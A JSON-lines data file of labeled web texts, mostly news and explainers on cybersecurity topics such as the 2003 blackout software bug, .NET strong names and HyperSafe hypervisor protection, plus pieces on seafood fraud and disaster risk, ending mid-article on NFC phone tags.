{"text": "There has been a marked increase in cyber attacks by State and Non-State hackerssince the Russia Georgia War of 2008.In addition to the cyber clashes resulting from Israel's Operation Cast Lead and theWeb site defacement of India's Eastern Railway, the British government hasreported thousands of cyber attacks occurring each day on its criticalinfrastructure.\nThe French Embassies in Britain, the U.S., China, and Canada came under Chinesecyber attacks in December 2008.\nThe government of Zimbabwe has been waging a cyber war against its oppositionparty for the past five years.\nAs this report is being written, a 60 day U.S. cyber security review on how the U.S.government may best proceed to protect its cyberspace from a wide variety of attacks against U.S. financial infrastructure and national security threats on a dailybasis.\nThis report aims to answer the following questions by examining three differentcyber events impacting almost a dozen nations:How effective is Social Network Analysis in Computer Network Exploitation?How critical is the ability to access black (classified) data in a cyber intelligenceeffort?Is there evidence that points to Russian government involvement in the Georgiacyber attacks of July and August 2008?1http://www.timesonline.co.uk/tol/news/uk/crime/article4592677.ece2http://intelfusion.net/wordpress/?cat=4133http://concernedafricascholars.org/the-glass-fortress/4http://news.cnet.com/8301-13578_3-10159975-38.html", "label": 1}
{"text": "Tracking the Blackout bug\nBuried in four million lines of C code\nA number of factors and failings came together to make the August 14th northeastern blackout the worst outage in North American history. One of them was buried in a massive piece of software compiled from four million lines of C code and running on an energy management computer in Ohio.\nTo nobody's surprise, the final report on the blackout released by a US-Canadian task force Monday puts most of blame for the outage on Ohio-based FirstEnergy Corp., faulting poor communications, inadequate training, and the company's failure to trim back trees encroaching on high-voltage power lines. But over a dozen of task force's 46 recommendations for preventing future outages across North America are focused squarely on cyberspace.\nThat may have something to do with the timing of the blackout, which came three days after the relentless Blaster worm began wreaking havoc around the Internet - a coincidence that prompted speculation at the time that the worm, or the traffic it was generating in its efforts to spread, might have triggered or exacerbated the event. When US and Canadian authorities assembled their investigative teams, they included a computer security contingent tasked with looking specifically at any cybersecurity angle on the outage.\nIn the end, it turned out that a computer snafu actually played a significant role in the cascading blackout - though it had nothing to do with viruses or cyber terrorists. A silent failure of the alarm function in FirstEnergy's computerized Energy Management System (EMS) is listed in the final report as one of the direct causes of a blackout that eventually cut off electricity to 50 million people in eight states and Canada.\nThe alarm system failed at the worst possible time: in the early afternoon of August 14th, at the critical moment of the blackout's earliest events. The glitch kept FirstEnergy's control room operators in the dark while three of the company's high voltage lines sagged into unkempt trees and \"tripped\" off. Because the computerized alarm failed silently, control room operators didn't know they were relying on outdated information; trusting their systems, they even discounted phone calls warning them about worsening conditions on their grid, according to the blackout report.\n\"Without a functioning alarm system, the [FirstEnergy] control area operators failed to detect the tripping of electrical facilities essential to maintain the security of their control area,\" reads the report. \"Unaware of the loss of alarms and a limited EMS, they made no alternate arrangements to monitor the system.\"\nWith the FirstEnergy control room blind to events, operators failed to take actions that could have prevented the blackout from cascading out of control.\nIn the aftermath, investigators quickly zeroed in on the Ohio line-tripping as a root cause. But the reason for the alarm failure remained a mystery. Solving that mystery fell squarely on the corporate shoulders of GE Energy, makers of the XA/21 EMS in use at FirstEnergy's control center. According to interviews, a half-a-dozen workers at GE Energy began working feverishly with the utility and with energy consultants from KEMA Inc. to figure out what went wrong.\nThe XA/21 isn't based on Windows, so it couldn't have been infected by Blaster, but the company didn't immediately rule out the possibility that the worm somehow played a role in the alarm failure. \"In the initial stages, nobody really knew what the root cause was,\" says Mike Unum, manager of commercial solutions at GE Energy. \"We spent a considerable amount of time analyzing that, trying to understand if it was a software problem, or if - like some had speculated - something different had happened.\"\nSometimes working late into the night and the early hours of the morning, the team pored over the approximately one-million lines of code that comprise the XA/21's Alarm and Event Processing Routine, written in the C and C++ programming languages. Eventually they were able to reproduce the Ohio alarm crash in GE Energy's Florida laboratory, says Unum. \"It took us a considerable amount of time to go in and reconstruct the events.\" In the end, they had to slow down the system, injecting deliberate delays in the code while feeding alarm inputs to the program. About eight weeks after the blackout, the bug was unmasked as a particularly subtle incarnation of a common programming error called a \"race condition,\" triggered on August 14th by a perfect storm of events and alarm conditions on the equipment being monitoring. The bug had a window of opportunity measured in milliseconds.\n\"There was a couple of processes that were in contention for a common data structure, and through a software coding error in one of the application processes, they were both able to get write access to a data structure at the same time,\" says Unum. \"And that corruption lead to the alarm event application getting into an infinite loop and spinning.\"\nTesting for Flaws\n\"This fault was so deeply embedded, it took them weeks of poring through millions of lines of code and data to find it,\" FirstEnergy spokesman Ralph DiNicola said in February.\nAfter the alarm function crashed in FirstEnergy's controls center, unprocessed events began to cue up, and within half-an-hour the EMS server hosting the alarm process folded under the burden, according to the blackout report. A backup server kicked-in, but it also failed. By the time FirstEnergy operators figured out what was going on and restarted the necessary systems, hours had passed, and it was too late.\nThis week's blackout report recommends that the U.S. and Canadian governments require all utilities using the XA/21 to check in with GE Energy to ensure \"that appropriate actions have been taken to avert any recurrence of the malfunction.\" GE Energy says that's a moot point: though the flaw has not manifested itself elsewhere, last fall the company gave its customers a patch against the bug, along with installation instructions and a utility to repair any alarm log data corrupted by the glitch. According to Unum, the company sent the package to every XA/21 customer - more than 100 utilities around the world - and offered to help install it, \"irrespective of their current support status,\" he says.\nThe company did everything it could, says Unum. \"We text exhaustively, we test with third parties, and we had in excess of three million online operational hours in which nothing had ever exercised that bug,\" says Unum. \"I'm not sure that more testing would have revealed that. Unfortunately, that's kind of the nature of software... you may never find the problem. I don't think that's unique to control systems or any particular vendor software.\"\nTom Kropp, manager of the enterprise information security program at the Electric Power Research Institute, an industry think tank, agrees. He says faulty software may always be a part of the electric grid's DNA. \"Code is so complex, that there are always going to be some things that, no matter how hard you test, you're not going to catch,\" he says. \"If we see a system that's behaving abnormally well, we should probably be suspicious, rather than assuming that it's behaving abnormally well.\"\nBut Peter Neumann, principal scientist at SRI International and moderator of the Risks Digest, says that the root problem is that makers of critical systems aren't availing themselves of a large body of academic research into how to make software bulletproof.\n\"We keep having these things happen again and again, and we're not learning from our mistakes,\" says Neumann. \"There are many possible problems that can cause massive failures, but they require a certain discipline in the development of software, and in its operation and administration, that we don't seem to find. ... If you go way back to the AT&T collapse of 1990, that was a little software flaw that propagated across the AT&T network. If you go ten years before that you have the ARPAnet collapse.\n\"Whether it's a race condition, or a bug in a recovery process as in the AT&T case, there's this idea that you can build things that need to be totally robust without really thinking through the design and implementation and all of the things that might go wrong,\" Neumann says.\nDespite the absence of cyber terrorism in the blackout's genesis, the final report includes 13 recommendations focused squarely on protecting critical power-grid systems from intruders. The computer security prescriptions came after task force investigators discovered that the practices of some of the utility companies involved in the blackout created \"potential opportunities for cyber system compromise\" of EMS computers.\n\"Indications of procedural and technical IT management vulnerabilities were observed in some facilities, such as unnecessary software services not denied by default, loosely controlled system access and perimeter control, poor patch and configuration management, and poor system security documentation,\" reads the report.\nAmong the recommendations, the task force says cyber security standards established by the North America Electric Reliability Council, the industry group responsible for keeping electricity flowing, should be vigorously enforced. Joe Weiss, a control system cyber security consultant at KEMA, and one of the authors of the NERC standards, says that's a good start. \"\"The NERC cyber security standards are very basic standards,\" says Weiss. \"They provide a minimum basis for due diligence.\"\nBut so far, it seems software failure has had more of an effect on the power grid than computer intrusion. Nevertheless, both Weiss and EPRI's Kropp believe that the final report is right to place more emphasis on cybersecurity than software reliability. \"You don't try to look for something that's going to occur very, very, very infrequently,\" says Weiss. \"Essentially, a blackout like this was something like that. There are other issues that are higher probability that need to be addressed.\"\nSoftware bug contributed to blackout \nIT Failures In The Great US Blackout \nSparks over US power grid cybersecurity \nNCSP drafts secure code guidelines \nCyber security alliance sets sights on Washington \nLeeds Uni, MS teach undergrads to write secure code", "label": 1}
{"text": "A Boston Globe study of over a hundred Boston-area seafood restaurants found that 48 percent of the fish was mislabeled. When asked about the discrepancies, some restaurant owners shrugged saying that everyone does it.\nThe most common kinds of fraud are mislabeling a fish as wild when it’s not, such as salmon, or selling a completely different fish than the one named, for instance selling a rockfish as a red snapper.\nIn the high priced world of caviar from threatened sturgeon, fraud exists on several levels, from directly misrepresenting the fish as farmed when it’s actually wild to counterfeit labels on the fish or the caviar tins.\nSeafood fraud not only cheats consumers but it could also adversely affect catch data that form the basis of sustainable fisheries management. In some cases, seafood fraud could undermine healthy choices.\nConsumer reports found many samples labeled as grouper were in fact tilefish, which contains much more mercury than grouper. The Food and Drug Administration recommends that pregnant women, women of child bearing age, and children avoid eating tilefish because of high levels of mercury.\nGovernment agencies that have the authority to enforce rules around seafood fraud have not made it a priority. While an estimated 86 percent of all the seafood that Americans consume is imported, the FDA inspects less than about two percent of it.\nOne of the challenges to combating seafood fraud, aside from the lack of DNA testing out in the field and slack government agencies, is the supply chain. Seafood often changes hands repeatedly from net to consumer. Determining where the fraud begins can be difficult.\n3 things you can do to fight seafood fraud:\n1. Buy whole fish.\n2. Be wary of very inexpensive seafood.\n3. Ask questions: Where was this fish caught? Is it in season?\nOther great ways you can make a difference.\nLINKS & VIDEOS\nSeafood Fraud Overview – Oceana\nCaviar Caveats – Science News\nMystery Fish – Consumer Reports\nFeds to Fight Massive Fraud in Seafood Sizes – Huff Post\nDon’t Be Fooled – Fresh\nBuyer Beware: Wild Salmon Scams Run Rampant, Randy Hartnell, Vital Choice Blog\nFish as Food in an Age of Globalization, University of British Columbia\nBait and Switch: How Seafood Fraud Hurts Our Oceans, Our Wallets, and Our Health, Oceana\nTrade Secrets: Renaming and Mislabeling of Seafood, University of British Columbia\nGovernment Falls Short on Seafood Inspections, Food and Water Watch\nHow Seafood Fraud Works, Boston Globe\nFish is often mislabeled along the supply chain from hook to fork.\nHake Hoax: Fish in Spain Not Always What Label Says\nHake is Spain’s most popular fish, but consumers aren’t always getting what they think they are buying. A scientific study conducted by the International Center for Investigative Journalists found that almost one in 10 fish purchased at markets in Spain were mislabeled.\nFish Fraud: CBS Report\nThe non-profit group, Oceana reports that nearly one in three fish purchased is mislabeled. CBS News contributor Katie Lee investigates seafood fraud and tells consumers what to look out for.", "label": 1}
{"text": "Sustainability issues grow as large urban centers add a million people, or or up to about 5%, per year. Social responses to acts of nature need to be tempered in order to prevent environmental disasters. Demand increases for tech solutions. Automation extends to robotics and space.\nRecent links (about 23):\nai “The Age of Assistants”: The View From Inside SRI\naugmented-reality “What Mountain is That?” New App Takes AR Outside the City Limits\nDatabase | EM-DAT\nInternational Strategy for Disaster Reduction\nInternational Strategy for Disaster Reduction (ISDR)\nDeath to Humans! Visions of the Apocalypse in Movies and Literature: Scientific American\nemail HOW TO: Undo “Send” in Gmail\nevents Online Event Registration â€“ Sell Tickets Online with Eventbrite\nrobotics IEEE Spectrum: Cyborg Fly Pilots Robot Through Obstacle Course\nsecurity David Ignatius – Pentagon’s cybersecurity plans have a Cold War chill\nsmartgrid IEEE Spectrum: $25 Billion European Smart Grid Market by 2020\nspace BBC News – Alien hunters ‘should look for artificial intelligence’\nui Make: Online : Multitouch robot swarm controller\nWorld’s Fastest-Growing Megalopolis Hides in Fog | Raw File\nReinventing the City to Combat Climate Change\nvisualization David McCandless: The beauty of data visualization | Video on TED.com\nUrban Risk Reduction: An Asian Perspective, Shaw et al, 2009\nUrbanization is outpacing general population growth in Asia. Case studies are described for localities and types of environmental disaster. Urban issues range from household, community, city, region, to nation. Lifestyles create hazards which induce, or worsen natural, events. The culture can be built on safety and resilience. Action planning may require assistance of specialized agencies. Pilot cities demonstrate projects such as local resource organization, citizen empowerment, and smaller units and chain of command. Lessons are learned from disaster recovery. A management information system was useful in at least one case. The decision-making pyramid includes global, national, city, building, and individual. Environmental issues include air and water pollution, waste and sewage, noise, land use, drainage and transport congestion, slums, flood and other common issues such as disease, fire, or crime. Strategies are sensitive to survival, peace, innovation from tradition, and sustainability. The disaster management cycle has its own information and communication issues in each phase, non, before, during and after. Risk reduction involves knowledge, perception, deepening, preparedness and dissemination. Surveys measure public awareness. Frameworks are provided by Millennium Development Goal, Hyogo Framework for Action, and UN International Strategy for Disaster Reduction. There are eighteen chapters, two parts, twenty-four authors.\nDisaster Risk Management Systems Analysis: A Guide Book, Baas, 2008\nThis book has a toolset for the characterization and strengthening of DRM at the international, national, province/district/municipality, community and institution layers. A framework enumerates initiatives for each of the periods for disaster risk reduction, response, and recovery. Preparedness links both development, through mitigation and prevention, and humanitarian assistance, through relief and recovery. Another framework for sustainable livelihoods indicates which households are most vulnerable. There is a list of key questions for leaders. A form is shown to document the strengths, weaknesses, opportunities and threats across levels. There are six modules, two annexes and many figures, relational maps, and checklists. It can be downloaded as a PDF from the web.\nEcological Engineering: Principles and Practices, Patrick C. Kangas, 2004\nHumans stress natural ecosystems through simplification of species and metabolic shifts. Research in emergent ecosystems includes agriculture, urban, and coastal or estuarine. Since prediction is limited, engineering epistemology requires building improvement based on design and test. Future directions include ecological nanotech, terraforming, biosensors, ecosensors, universal pollution treatment, and aquaculture. Technoecosystems maintain a balance between living and hardware systems. Since the laboratory includes the environment, the hacker code of ethics applies to ecological engineering. Treatment reduces costs of pollution. Ecological economics adds measures of emergy or embodied energy, natural capital, sustainability, carrying capacity and many types of ecosystem services to improve life-support value. Sold waste management discusses landfills, composting, and industrial ecology. The energy value of the waste is the same as that used to make the product. Wetlands are used for wastewater treatment by spiraling. An identical decay equation for decomposition evolved in parallel, linking design intuitions for both biodegradation in ecology and wastewater engineering. Restoration ecology connects to succession and is explained for salt marshes, artificial reefs, and educational exhibits. Microcosmology includes living models and replication issues. Soil bioengineering is shown for urban imperviousness, stormwater management bioretention and agricultural erosion control. This realm includes beavers, coastal vegetation and self-building machines. Biodiversity is increased by exotic species. The food web describes feeding interactions. The series of multiple states in catastrophe theory is used to explain invasion. Control theory ranges from machine analogies to biotech. Circuit symbols are used for ecosystem models. H T Odum coined a lot of the names of new ecosystems. Principles include energy signature, self-organization and preadaptation. There are nine chapters\nBuilding Safer Cities: The Future of Disaster Risk, edited by Kreimer et al, 2003\nActual and new types of disasters are discussed, e.g. due to rapid urbanization or climate change. Impact and preparedness affect several geographic scales of security, environmental and human, including economics. politics, and society. There are several major worldviews. The main concerns are globalization, environment, social vulnerability, and protecting infrastructure. The various methods of balancing costs of risks include privatization, government taxation and globalization. Africa often suffers export losses, which leads to tens of thousands of youth mortalities, when other countries have disasters. Hazard reduction involves robust design, flexible and adaptable systems, reversal of vulnerability trends, and societal preparedness. Coastal zone classifications include protect, retreat and accommodate. Resilience measures how much disturbance can be absorbed, and the capability for self-reorganization. Regional analysis, management and action are required for flooding. Study approaches include scenarios and consequences. The fact that life support networks, e.g. utilities, affect eachother as external technological causes has not been taken into account traditionally. Critical infrastructure includes telecom, power, energy, storage, transportation, water, financial, emergency services, and government. Buildings can be retrofit using new tech for earthquakes risk. These were papers for a conference of international financial institutions. There are four parts, twenty chapters, twenty-six authors. They may develop literacy for the terminology. Most chapters have conclusions or recommendations. The web had PDFs and Google books has full content.\nCounting Heads, David Marusek, 2005\nThis novel is a scifi cyberpunk mystery. There are three parts, forty-five chapters, and an epilogue. Chapters are numbered, e.g. up to 1.3 or 2.29. Part 3 adds days of the week to the titles up to Friday 3.13. It begins in first person for part 1 which was originally a short story. The year is 2092. There are a pair of main characters. Tech includes nanotech, clones, robotic insects, friendly AIs, wearable valet processors. holopresence conferences, and high velocity surface travel. HomCom is the initial antagonist. There is a realistic world. The rest of the parts are told in third person after forty years have passed. The point of view changes among several main characters. The antagonist may be an AI. A glossary would be appropriate. The title refers to heads for which the body can be replaced. A sequel was published, Mind Over Ship.", "label": 1}
{"text": "If you liked the post, Share on Facebook, Tweet and Google Plus (use buttons above). You can also Subscribe to our feed via Email for free.\nComputer Forensics as a Career\nComputer forensics also known as Cyber Forensics or Digital Forensics is pertaining to legal evidence found in computers & digital storage media. Computer forensics is the analysis done to collect evidence during crime investigations to detect illegal or unauthorized activities or frauds which are done using computers and internet.\nDemand For Computer Forensics\nAlthough computer forensics is relatively a new field, Computer forensics experts have been in high demand for jobs since this field first appeared few years back(around 1985), but that demand is growing even larger as both government security agencies and private firms are recruiting cyber investigators in a huge amount.\nWe know that cyber crimes like Identity Theft, Email Hacking, Child Pornography, Cyber-stalking, Copyright infringement, Spamming, Cyber terrorism etc. are on a rise. Due to this dark side of internet, various companies are hiring computer forensics experts to root out the cyber criminals.\nThe scope of computer analysic can vary from simple information retrieval to reconstructing a series of events. Although it is mostly associated with the investigation of a wide variety of computer crime, computer forensics may also be used in civil proceedings.\nGenerally speaking, there are huge differences between the salaries of public sector forensic examiners(Government employed) and private sector forensic examiners. The average annual salary of someone working in this field ranges from $40,000 to $100,000. Also note that salary pay scales may differ in different countries.\nTo start a computer forensics career, you will likely need a computer forensics degree or a related degree (e.g., computer science, criminal justice or engineering). Post-degree certification may help you to get recruited quickly. Technical and analytical skills are must for all computer forensics careers. Knowledge and technical skills in vast range of computer storage devices, operating systems, programming languages and software applications gives more opportunities.\nIf you have obtained degree qualification or certified training which is recognized internationally, you have the privileges to work in any country as you like. It is easy for you to get job offers wherever you go.\nYou may need knowledge in following things to become a successful computer cyber investigator:\n- Computer networking & routing\n- Communication protocols and security\n- Reverse engineering\n- Computer forensics tools such as:\n- Password crackers\n- Forensic Toolkit (FTK) software applications\n- PTK Forensics\n- The Sleuth kit\n- The Coroners Toolkit\n- Selective file dumper\nComputer forensics is a very challenging and exciting career which provides great self satisfaction. So get ready to become a computer forensics analyst and make your future brighter.", "label": 1}
{"text": "Strong Name (further referred to as \"SN\") is a\ntechnology introduced with the .NET platform and it brings many possibilities into\n.NET applications. But many .NET developers still see Strong Names as security\nenablers (which is very wrong!) and not as a technology uniquely identifying\nassemblies. There is a lot of misunderstanding about SNs (as we could see\nin the article \"Building\nSecurity Awareness in .NET Assemblies : Part 3 - Learn to break Strong Name .NET Assemblies\nthis article attempts to clear those up. Now let's see what SNs are, what we\ncan use them for and how they work.\nStrong Name is a technology based on cryptographic\nprinciples, primary digital signatures; basic idea is presented in the figure\nAt the heart of digital\nsignatures is asymmetric cryptography (RSA, EL Gamal), together with hashing\nfunctions (MD5, SHA). So what happens when we want to sign any data? I'll try to\nexplain what happens in the figure above.\nFirst we must get a public/private\nkey pair (from our administrator, certification authority, bank, application\netc.) that we will use for encryption/decryption. Then DATA (term DATA\nrepresents general data we want to sign) is taken and run through some hashing algorithm\n(like MD5 or SHA - however, MD5 is not recommended) and hash of DATA is\nproduced. The hash is encrypted by private key of user A and attached to\nplaintext data. The DATA and attached signature are sent to user B who takes\npublic key of user A and decrypts attached signature where hash of DATA is stored\nand encrypted. Finally user B runs DATA through the same hashing algorithm as\nuser A and if both hashes are the same then user B can be pretty sure that the DATA\nhas not been tampered with and also identity of user A is proven. But this is a\nnaive scenario because it's hard to securely deliver public keys over insecure\ncommunication channels like Internet. That is why certificates were introduced\nbut I will not cover it here because certificates aren't used in SNs and\ndelivery of public key is a matter of publisher's policy (maybe I can cover\ndistribution of public keys, certificates and certification authorities in another article). Now let's assume that public key was delivered to user B\nThis process is used in the\ncreation of SN for .NET applications. You can translate term DATA as\nassemblies and apply the same steps to them when SNs are used. But what is the\npurpose and usage of this SN technology? Simple - there is the only one reason –\nto uniquely identify each assembly. See section 188.8.131.52\nof CLI ECMA specification where SNs are defined:\nThis header entry points to\nthe strong name hash for an image that can be used to deterministically\nidentify a module from a referencing point (Section 184.108.40.206).\nSNs are not any security\nenhancement; they enable unique identification and side-by-side code execution.\nNow we know that SNs are not\nsecurity enablers. Where to use them then? We can see two scenarios where SNs\ncan be used:\nVersioning solves known problem called\nas \"DLL hell\". Signed assemblies are unique and SN solves problem with\nnamespace collisions (developers can distribute their assemblies even with the\nsame file names as shown of figure below). Assemblies signed with SNs are\nuniquely identified and are protected and stored in different spaces.\nIn addition to collision\nprotection, SN should help developers to uniquely identify versions of their\nThat is why when developers want\nto use GAC (Global Assembly Cache) assemblies must be signed to separate\neach publisher's namespace and to separate each version.\nThe second important feature of\nStrong Names is authentication; a process where we want to ensure ourselves\nabout the code's origin. This can be used in many situations, such as assigning\nhigher permissions for chosen publishers (as will be shown later) or ensuring\nthat code is provided by a specific supplier.\nIt has been shown that signatures\nand public keys can be easily removed from assemblies. Yes, that is right but\nit is correct behavior even when we use digital signatures in emails or\nanywhere else! Let's see how it works!\nWe can use some analogy from our\nreal life. Let's assume you are a boss of your company and you are sending an\nemail to your employees where new prices of your products are proposed. This\nemail is a plaintext and you use some non-trusted outsourcing mailing services.\nYour communication can be easily monitored and your email can be easily accessed\nby unauthorized persons who can change its content, for instance your prices\nproposed in email.\nHow to solve that? The answer is cryptography,\nagain digital signatures that you can use to authenticate to your employees and\nto verify content of your email. Simply you have to add a digital signature to\nyour email and then require your employees will trust just verified\nemails that have your valid digital signature. Let's assume that all PKI\ninfrastructure is set up and working correctly. Now, when an intruder removes\nthe digital signature from your email, his employees will not trust them\nbecause they can't be verified and application will alert users about this insecure\nThe same situation is when SNs\nare used. You can remove SNs from assemblies , but this makes no sense because just\nas in the case of emails, assemblies without SNs can't be trusted when\nenvironment is set up to require those digital signatures or SNs.\nThis is also related to another very\nimportant point in .NET – Code Groups & Policy Levels. As in\nthe case of emails, when PKI is setup in a company and security policy is defined that\nemployees can't trust and verify emails which are not signed or where the encrypted\nhash value is different from hashed plaintext content. The same can be done\nwith .NET Framework using the .NET Configuration tool on each machine or\nby group policy for large networks.\nThis tool provides configuration\noptions for .NET Framework including Runtime Security where policy\nlevels and code groups can be set. Policy levels work on\nintersection principle as shown in the figure below\nCode groups (inside of those policy\nlevels) provide permission sets for applications that belong to them according\nto their evidence (origin, publisher, strong name etc.). The assembly will get\nthose permissions based on the intersection of code groups from each policy\nlevel applicable to it. This is a very important improvement in security\narchitecture and improves the traditional Windows security model that is process\ncentric (see figure below).\n.NET introduces Code Access\nSecurity (CAS) which is used to identify the origin of code and assign to it specific\nrestrictions and then make security policy more granular and protecting against\nattacks such as luring attacks.\nHowever my intention isn't to\ndescribe CAS or Windows security internals (I can write about it in other\narticles) but show SN principles. Let's move back to it!\nNow we can move to the second use\nfor SN - administrators and developers can use SNs together with code groups to\nprovide assemblies with higher permissions (not the default ones that assembly\nwill acquire according to default .NET Framework settings). Let's see an\nexample! I must point out that this is just a simplified example how SN can\nidentify publisher, this is NOT a way to obey CLR security or how to use it\nin enterprise environment. That is why please try to understand the example\nas a general principle available with SNs but NOT as a design pattern!\nUsage of SNs as authentication is a more complex problem and there are many\nnon-trivial issues when SNs are involved. But it's out of scope of this article,\nso now back to the sample!\nTake my sample Windows Forms\nproject and rebuild it and put .exe file on any share on your LAN. Then try to\nstart this application from this share and click on button – what happens? A security\nexception is raised because application doesn't have enough privileges.\nNow go to .NET Configuration tool\nand add a new code group\nadd new code group called Test\nand in the second dialog choose Strong name, click on\nImport button and locate the .exe file in Debug folder of project folder and\nfinally assign full trust for this application\nNow you have created a new code group containing just\nyour sample application. Now go to your network share and try to start sample\napplication again. And it works! Why? Because it belongs to our new code group Test\nwith full trust permissions.\nNow remove SN from sample application (as described in his article or just\nsimply remove attribute [assembly: AssemblyKeyFile(\"KeyFile.snk\")]\nfrom AssemblyInfo.cs file), recompile and publish it on share. Try to\nrun it and what happens? It's not working! Why? Because assembly can't show this\nstrong name evidence and it belongs to the default code group (with limited\nIt's not surprising, nothing special, no magic – just\ncorrect usage of Strong Name technology. SNs are easy and powerful but\nwe have to understand how and where to use them. That is why I want to\noutline some \"issues\" that are connected with SNs that will present all\ncapabilities that we can expect from SNs.\nSo what are the weaknesses of SNs? First we have to realize\nthat SNs are a lightweight version of Authenticode and they provide fast and easily\nused technology to get enterprise features like versioning and authentication.\nBut this ease of use must be paid by something and here goes a list of\n- It can be very hard to securely associate publisher with his\npublic key when certification authorities are not involved. Publisher must ship\nhis public key by himself and he must ensure that public key is not tampered.\nWithout certification authorities it's impossible to do it securely when our\nproducts are distributed over insecure channels and there are no other ways to\nverify the publisher's public key.\n- There is no way how to revoke public key when the private key has\nbeen compromised. As this is easily done in case of certificates (just publish\nrevoked certificates on CRL, Certificate Revocation List) in case of SNs, revocation\nis a nightmare. Just imagine that you as a junior security engineer has\nlost USB key with your private key used to sign your assemblies. Then you'll\nhave to call and email your clients with newly signed assemblies, give them\nyour new public key and setup all environments again). There is no automatic\nway like CRL, everything must be done \"by hand\".\nAuthenticode can be considered as more powerful from an enterprise\nand architectural perspective. So why not use Authenticode instead of SNs?\nHere are the reasons:\n- SNs don't require any third party (such as Verisign) to\ncreate signatures and manage public keys. Any developer can easily create\nand manage his keys (see chapter \"Generate key pair with sn.exe tool\" in\nmy free book \".NET\nin Samples\") without payment to any third party.\n- SNs can avoid network connections and PKI involvement so\napplications can run and be verified even when network connections are not\n- Authenticode certificates are not a part of assembly names\nand that is why they can't separate publisher's namespaces like SNs do. Do\nyou remember the statement from ECMA in the beginning? That SNs should \"deterministically\nidentify\" modules and this is the most important reason. So not a security\nenabler but unique identification is the primary reason for SNs! And\nAuthenticode is not designed for this purpose!\nI hope this helps you understand the strong name technology in\nthe .NET Framework, and helped you see that it is very powerful, but with defined\nlimits. It is a technology that should be used appropriately.\nWith SNs we can uniquely identify an assembly and run\nside-by-side our assemblies. Security scenarios are not recommended to be used\nwith Strong Names (even when it's supported by .NET Framework), just in case\nyou are advanced in security and working with certificates and key management.\nThere are many design patterns on how to use Strong Names and all this depends on\napplication architecture, client requirements and infrastructure settings\n(Active Directory, PKI etc.).\nThere could be much more written about it (like usage of SNs\nin large companies, problems with key distribution, etc.), but this was not\nintended for this article, it was just a reaction to some misinterpretation of\nthis technology and the article is intended to put it right.", "label": 1}
{"text": "A team of researchers has come up with a way to stop malicious code from spreading from one virtual machine to the hypervisor and from there to other virtual machines.\nThe researchers from North Carolina State University said that their \"hypersafe\" technology could protect virtualised system against this kind of threat, known as \"virtual machine escape\". The team's research is set to be presented in a paper called HyperSafe: A Lightweight Approach to Provide Lifetime Hypervisor Control-Flow Integrity on 18 May at the thirty-first IEEE Symposium.\nWhile such virtual machine risks remain largely theoretical, the fear of them is holding back wider adoption of technologies such as cloud computing, according to assistant professor of computer science Xuxian Jiang and PhD student Zhi Wang, the developers of the technology.\nCloud computing routinely relies on virtualisation to host the computing capacity of multiple customers on the same physical system, raising the possibility that a compromise of a virtual machine belonging to one customer could spread to those of other customers.\nThe software developed by Jiang and Wang, called HyperSafe, aims at stopping such attacks by protecting the integrity of the hypervisor, they said.\nIt uses two techniques to ensure this integrity: non-bypassable memory lockdown and restricted pointer indexing. The first relies on security features built into modern processors to lock down the memory range that includes executable code, according to the researchers.\nThe effect is to protect the hypervisor's code and static data from being compromised, even in the presence of exploitable memory corruption bugs such as buffer overflows, they said. New code can only be introduced by the hypervisor administrator.\nThe second technique — restricted pointer indexing — creates an initial profile of the hypervisor's normal behaviour, and then prevents any deviation from that profile.\n\"Restricted pointer indexing introduces one layer of indirection to convert the control data into pointer indexes,\" Jiang and Wang wrote in the paper. \"These pointer indexes are restricted such that the corresponding call/return targets strictly follow the hypervisor control flow graph, hence expanding protection to control-flow integrity.\"\nOnly the hypervisor administrators can introduce changes to the hypervisor code, according to Jiang.\nSo far the HyperSafe code developed by Jiang and Wang works with the BitVisor and Xen hypervisors, but the researchers said it could be adapted for other Type-I, bare-metal hypervisors such as VMware ESX and Microsoft Hyper-V.\nIn its current form the hypervisor code would need to be modified to work with HyperSafe, the researchers said. They said they currently have no plans to commercialise the project, but are open to working with software vendors.\nHyperSafe was developed with funding from the US Army Research Office and the National Science Foundation.\nCommercial vendors have also begun to recognise the importance of security for pushing cloud adoption. In January, for instance, Cisco, VMware and NetApp announced a three-way partnership and a new architecture for secure, multi-tenant cloud datacentres.\nThe Secure Multi-tenancy Design Architecture (SMDA) works across existing products from the three companies to isolate the IT resources and applications of different clients or business units that share a common cloud infrastructure.", "label": 1}
{"text": "Phones Gain Ability to Learn by Touching\nNEW YORK (AP) - There’s a form of extra-sensory perception called psychometry, whose practitioners claim to learn things about objects by touching them. Smartphones set to be released this month by Samsung and Sony will have some of that ability: they’ll learn things when you touch them to pre-programmed \"tags.\"\nFor example, you can program a tag with your phone number, and stick it on your business card. When someone taps the phone to the card, the phone would call you. Or you can put a tag on your night stand. Place the phone there, and it goes into \"alarm clock\" mode, holding your calls until the morning.\nSamsung Electronics Co. announced this week that it will be selling these tags in the form of stickers it calls \"TecTiles\" - $15 for 5 of them. They’ll work with its new flagship Samsung Galaxy S III smartphone, set to launch in a few weeks, and several others already in the market, including the HTC EVO 4G LTE sold by Sprint Nextel.\nSony Corp.’s Xperia Ion, to be released June 24, will come with the ability to read different coin-like plastic tags that read \"Home,\" ’’Office\" and so forth. The tags cost $20 for four, and the phone can be programmed to react differently to each tag. The \"Car\" tag can launch a navigation application, for instance. Tapping \"Home\" can send a text message to the rest of the family that you’re home, and set the ringer volume to maximum.\nThe big push behind the technology, which is known as Near-Field Communications, comes from companies that see the phone as the wallet of the future. When touched to payment terminals, NFC-equipped phones can act as credit or debit cards.\nBut turning phones into credit cards is a tall order. Mobile payments already work with a few phones, but broad adoption is being held up while cellphone companies, banks, payment processors and retailers work out who pays for what and who benefits.\nThis ability to sense things close by is made possible by a new type of communications hardware in phones, complementing long-range cellular radios, medium-range Wi-Fi and short-range Bluetooth.\nThe latest version of Google Inc.’s Android software, known as Ice Cream Sandwich, comes with the ability to use NFC to communicate from phone to phone. When the backs are tapped together, the owners can trade information like contacts.\nSamsung takes this one step further with the Galaxy S III. Tap two phones together, and they set up a connection via Wi-Fi. That means the owners can walk away from each other, and as long as they’re in the same room or so, they can transfer photos and even hefty video files between their phones.\nThere are issues to work out. The Samsung tags can be read by most Android phones that have NFC capability, but not the Sony phone. Samsung and HTC phones won’t recognize the Sony tags.\nApple Inc., whose iPhones are trendsetters in many ways, hasn’t built NFC into them - yet. Its patent filings hint at an interest in NFC, but they’ve given no clue when the technology might show up in iPhones.\nNick Holland, an analyst with Yankee Group, believes NFC will shine first in non-payment applications, because they’re easier to sort out, and the technology has many uses. There have been NFC trials in Sweden, using phones as hotel room keys, he points out. Another compelling use case would be Wi-Fi hotspots. A 